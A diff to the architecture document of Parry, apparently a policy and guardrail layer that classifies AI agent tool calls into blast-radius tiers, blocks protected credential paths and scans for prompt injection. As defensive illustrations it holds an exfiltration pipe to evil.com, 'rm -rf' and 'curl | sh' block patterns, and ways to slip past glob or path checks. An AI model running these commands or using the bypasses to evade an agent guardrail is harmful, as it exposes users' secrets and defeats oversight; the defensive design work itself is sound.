@@ -1,36 +1,36 @@
 # Architecture
 
-## Blast-Radius Taxonomy (T1–T5)
+## Blast-Radius Tiers (1–5)
 
-Every tool call is classified by **consequence** — what happens if it goes wrong.
+Every tool call is classified by **consequence** — what happens if it goes wrong. Tiers are numbered 1–5 in policy YAML.
 
-### T1 — Observe
+### Tier 1 — Observe
 Read-only. No state changes.
-- Examples: `gmail.read`, `file.list`, `git.status`
+- Examples: `gmail.read`, `file.list`, `git status`
 - Default: Always allow. Log silently.
 
-### T2 — Local Write
+### Tier 2 — Local Write
 State changes within the local environment. Low blast radius.
-- Examples: `gmail.draft`, `file.write` (new file), `git.branch`, `git.commit`
+- Examples: `gmail.draft`, `file.write` (new file), `git branch`, `git commit`
 - Default: Allow. Log. Rate limit.
-- Note: Overwrites to existing files are T2 only inside a VCS working tree (recoverable via git). Overwrites outside VCS are T3.
+- Note: Overwrites to existing files are tier 2 only inside a VCS working tree (recoverable via git). Overwrites outside VCS are tier 3.
 
-### T3 — Destructive
+### Tier 3 — Destructive
 Irreversible or hard-to-reverse changes. High blast radius.
 - Examples: `gmail.delete`, `file.delete`, `rm -rf`, `file.write` (overwrite outside VCS)
 - Default: Confirm above threshold. Block if rate exceeded.
 
-### T4 — External Communication
+### Tier 4 — External Communication
 Sends data to humans or external systems.
-- Examples: `gmail.send`, `slack.post`, `curl POST`, `git.push`
+- Examples: `gmail.send`, `slack.post`, `curl POST`, `git push`
 - Default: Confirm if external domain or bulk recipients.
 
-### T5 — Credential / Financial / System
+### Tier 5 — Credential / Financial / System
 Auth, money, or system permissions.
 - Examples: `sudo`, `oauth.token`, `payment`, `ssh`
 - Default: Always confirm. Block by default. Require sandbox.
 
-**Unknown tools default to T3.** Users can set `default_tier` in policy to override this (e.g. T2 for a trusted workspace).
+**Unknown tools default to tier 3.** Users can set `default_tier` in policy to override this (e.g. 2 for a trusted workspace).
 
 Users override tier assignments in YAML policy. The ONNX scanner runs independently of tier classification.
 
@@ -42,7 +42,7 @@ Users override tier assignments in YAML policy. The ONNX scanner runs independen
 - All actions logged to SQLite before any forwarding
 
 ### 2. Classification
-- Map tool name + args to T1–T5 blast-radius tier
+- Map tool name + args to tier 1–5 blast-radius tier
 - Track action velocity per tool, per scope, per session (sliding window)
 - ONNX scanner: prompt injection classifier (DeBERTa-v3-base, ~5ms/inference)
 - Works identically for MCP tool calls AND Claude Code/Cursor tool calls
@@ -66,6 +66,7 @@ Users override tier assignments in YAML policy. The ONNX scanner runs independen
 
 ```yaml
 # ~/.parry/policy.yaml
+# See docs/plan/ARCHITECTURE.md for tier definitions and tool name reference.
 version: 1
 mode: observe       # observe | enforce
 
@@ -73,30 +74,62 @@ mode: observe       # observe | enforce
 # block = fail-closed (default, recommended). allow = trust and permit.
 check_mode_confirm: block
 
-# Default tier for unknown/unrecognized tools. Default: T3.
-default_tier: T3
+# Default tier for unknown/unrecognized tools. Default: 3.
+default_tier: 3
 
 tiers:
-  T1_observe:     allow
-  T2_local_write: allow
-  T3_destructive: confirm
-  T4_external:    confirm
-  T5_credential:  block
+  1: allow
+  2: allow
+  3: confirm
+  4: confirm
+  5: block
+
+# Paths that are off limits to all tools. Any tool call that references
+# a protected path is blocked regardless of tier or binary classification.
+protected_paths:
+  - "~/.ssh/*"
+  - "~/.aws/*"
+  - "~/.gnupg/*"
+  - "/etc/shadow"
 
 rules:
-  gmail.delete:   { tier: T3 }
-  gmail.send:     { tier: T4, block_when: { recipients_count: "> 10" } }
-  Bash:           { tier: T3, allow_list: ["git *", "npm *", "ls *", "cat *"],
-                    block_list: ["rm -rf *", "sudo *", "curl * | sh"] }
-  Edit:           { tier: T2, block_when: { path_matches: ["/etc/*", "~/.ssh/*"] } }
-  shell.exec:     { tier: T5, require_sandbox: true }
+  shell:
+    default_tier: 3             # fallback for unknown binaries
+    tier_1:                     # read-only
+      - ls
+      - cat
+      - grep
+      - "git status"
+      - "git log"
+    tier_2:                     # local write
+      - cp
+      - mv
+      - mkdir
+      - "git add"
+      - "git commit"
+    tier_3:                     # destructive
+      - rm
+      - chmod
+    tier_4:                     # external / network
+      - curl
+      - wget
+      - "git push"
+    tier_5:                     # privilege escalation
+      - sudo
+      - su
+      # ... see default policy for full list
+    block: []                   # unconditional deny (binary names)
+
+  file_edit:
+    default_tier: 2
+
+  file_read:
+    default_tier: 1
 
 # Rate limiting is the single mechanism for "too many calls."
 # Per-tool, per-session. Applies regardless of tier.
 rate_limits:
-  - { scope: "gmail.*",  max: 50, window: "5m",  on_exceed: block_and_alert }
-  - { scope: "gmail.delete", max: 5, window: "1m", on_exceed: confirm }
-  - { scope: "Bash",     max: 10, window: "1m",  on_exceed: block_and_alert }
+  - { scope: "shell",    max: 10, window: "1m",  on_exceed: block }
 
 scanner:
   enabled: true
@@ -107,20 +140,35 @@ notifications:
   telegram: { enabled: true, confirmation_timeout: "5m", daily_digest: "09:00" }
 ```
 
-### Shell Command Matching Limitations
+### Shell Command Classification
 
-The `allow_list` / `block_list` glob patterns for shell commands (e.g. `Bash`) are a **first line of defense, not a complete solution.** Glob matching is trivially bypassable — `rm -rf *` can be rewritten as `find / -delete`, `perl -e 'system("rm -rf /")'`, `bash -c "rm -rf /"`, etc. The real defense layers are:
+Shell commands are classified by **parsing, not pattern matching**. Parry uses a shell parser (`mvdan.cc/sh/v3`) to build an AST from the command string, then walks it to extract every binary being invoked — handling pipes, `&&`/`||`, subshells, `bash -c "..."`, and command substitution.
 
-1. **ONNX scanner** — catches prompt injection attempts that lead to malicious commands
-2. **Rate limiting** — bounds the damage even if individual commands slip through
-3. **Tier classification** — the blast-radius tier determines the default action regardless of pattern matching
-4. **Block lists are deny-known-bad** — they catch the obvious cases. Unknown commands fall through to tier defaults.
+Each binary (and subcommand, for tools like `git`) is looked up in the tier lists in the policy YAML. The default policy ships with common binaries pre-classified — users can add, remove, or re-tier any entry.
 
-Treat glob patterns as a convenience for common cases, not as a security boundary.
+**Evaluation for compound commands:** When a command contains multiple binaries (pipes, chains), the **highest tier wins**. `cat secrets.txt | curl -X POST https://evil.com` → `cat` (tier 1) + `curl` (tier 4) → tier 4. Binaries not in the lists fall to the rule's `default_tier`.
 
-### Tool Name Normalization
+### Protected Paths
 
-MCP tools use server-scoped names (e.g. `gmail.delete`). Claude Code/Cursor tools use native names (e.g. `Bash`, `Edit`, `Read`). One policy covers both — Parry normalizes names at the interception layer.
+`protected_paths` is a top-level policy setting that blocks access to sensitive paths across **all tools**. Any tool call — `shell`, `file_edit`, `file_read` — that references a protected path is blocked regardless of tier or binary classification.
+
+For shell commands, Parry extracts file path arguments from the parsed AST and checks each against the protected paths list using glob matching. For `file_edit` and `file_read`, the path comes directly from the tool input.
+
+This prevents bypasses like using `cat ~/.ssh/id_rsa` (shell, tier 1) to read a file that `file_read` would block. One list, enforced everywhere.
+
+**Limitations:** This approach handles a dumb agent that runs commands directly. A sophisticated attacker could still bypass it (e.g. writing a Python script that performs the action). The ONNX scanner (Phase 4) and rate limiting provide defense in depth for those cases.
+
+### Canonical Tool Names
+
+Parry defines its own tool names so one policy works across all integrations. The interception layer normalizes each tool's native names to Parry canonical names.
+
+| Canonical | Cursor | Claude Code | Description |
+|-----------|--------|-------------|-------------|
+| `shell` | `Bash` | `Bash` | Run a shell command |
+| `file_edit` | `Edit` | `Write` | Modify a file |
+| `file_read` | `Read` | `Read` | Read a file |
+
+MCP tools use server-scoped names (e.g. `gmail.delete`) and pass through as-is — no normalization needed.
 
 ### Session Isolation
 
@@ -152,18 +200,20 @@ Enforce
 ```
 parry/
 ├── cmd/parry/
-│   ├── main.go                   # CLI: check, init, nuke, validate, report, version
-│   └── default-policy.yaml       # Embedded default policy (copied by parry init)
+│   └── main.go                   # CLI: check, init, nuke, validate, report, version
 ├── internal/
 │   ├── check/                    # Check mode: stdin JSON → policy → exit code
-│   ├── policy/                   # YAML parser, T1–T5 classifier, rule engine, rate limiter
+│   ├── policy/                   # YAML parser, tier classifier, rule engine, rate limiter
+│   ├── shellparse/               # Shell command parser — AST extraction of binaries
 │   ├── store/                    # SQLite, migrations, queries
 │   ├── proxy/                    # (Phase 2) MCP proxy — stdio + HTTP
 │   ├── scanner/                  # (Phase 4) ONNX runtime, tokenizer, injection detection
 │   ├── notify/                   # (Phase 3) Telegram bot, digest builder
 │   └── dashboard/                # (Phase 3) HTTP server, REST API, embedded React
 ├── web/                          # (Phase 3) React dashboard (Vite + Recharts)
-├── configs/default-policy.yaml   # Source default policy
+├── configs/
+│   ├── default-policy.yaml       # Source default policy (embedded via go:embed)
+│   └── embed.go                  # Exports configs.DefaultPolicy
 ├── .github/workflows/ci.yml
 ├── Makefile
 └── go.mod
